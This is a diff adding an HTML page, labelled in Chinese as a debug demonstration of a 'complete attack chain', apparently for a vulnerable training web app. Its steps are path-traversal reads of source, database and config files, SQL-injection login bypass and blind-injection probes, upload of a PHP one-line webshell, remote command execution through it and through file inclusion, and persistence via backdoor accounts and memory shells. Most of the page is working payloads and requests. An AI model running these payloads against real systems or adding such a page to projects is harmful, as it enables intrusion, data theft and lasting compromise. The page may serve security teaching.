@@ -1,0 +1,51 @@
+<!-- 调试信息 - 完整攻击链演示页面 -->
+<h2>⚔️ 完整攻击链</h2>
+<p>文件包含漏洞 + SQL注入 + 文件上传联动攻击演示</p>
+
+<h3>Step 1: 信息收集（路径穿越）</h3>
+<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
+# 读取应用源码
+GET /page?name=../app.py
+
+# 读取数据库文件
+GET /page?name=../data/users.db
+
+# 读取配置文件
+GET /page?name=../config.py
+</pre>
+
+<h3>Step 2: SQL注入获取管理员密码</h3>
+<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
+# 万能密码登录
+POST /login
+username=admin' OR '1'='1' --&password=
+
+# 布尔盲注猜解数据库名
+' AND LENGTH(database())=4 --  正常
+' AND SUBSTR(database(),1,1)='t' --  正常
+</pre>
+
+<h3>Step 3: 文件上传WebShell</h3>
+<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
+# 上传一句话木马
+POST /upload
+Content-Type: multipart/form-data
+file=shell.php (content: &lt;?php @eval($_POST['cmd']); ?&gt;)
+</pre>
+
+<h3>Step 4: 远程命令执行</h3>
+<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
+# 访问木马执行命令
+POST /static/uploads/shell.php
+cmd=system('id');
+
+# 通过文件包含执行
+GET /page?name=../static/uploads/shell.jpg%00
+</pre>
+
+<h3>Step 5: 权限维持</h3>
+<ul>
+    <li>上传大马（大篇幅WebShell管理界面）</li>
+    <li>创建后门账号</li>
+    <li>留内存马（仅Java/PHP环境）</li>
+</ul>
